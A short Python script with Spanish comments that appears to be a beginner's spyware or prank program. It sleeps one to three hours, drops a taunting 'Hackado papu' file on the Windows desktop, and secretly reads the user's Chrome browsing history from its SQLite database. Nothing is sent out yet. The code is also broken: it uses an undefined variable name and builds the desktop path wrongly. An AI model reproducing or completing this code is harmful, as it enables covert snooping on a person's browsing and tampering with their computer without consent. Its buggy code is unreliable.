import os
import sqlite3
from time import sleep
from random import randrange


HACKER_FILE_NAME = "PARA TI.txt"


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop\\" + HACKERFILE_NAME, "w")
    hacker_file.write("Hackado papu")
    return hacker_file


def delay_action():
    n_hours = randrange(1, 4)
    print("Durmiendo {} horas".format(n_hours))
    sleep(n_hours * 60 * 60)


def get_chrome_history(user_path):
    try:
        history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall()
        connection.close()
        return urls
    except sqlite3.OperationalError:
        return None


def main():
    # Esperaremos entre 1 y 3 horas
    delay_action()
    # Calculamos la ruta de windows
    user_path = "C:\\Users\\" + os.getlogin()
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Recogemos su historial de Google
    chrome_history = get_chrome_history(user_path)
    if chrome_history:
        pass


if __name__ == "__main__":
    main()
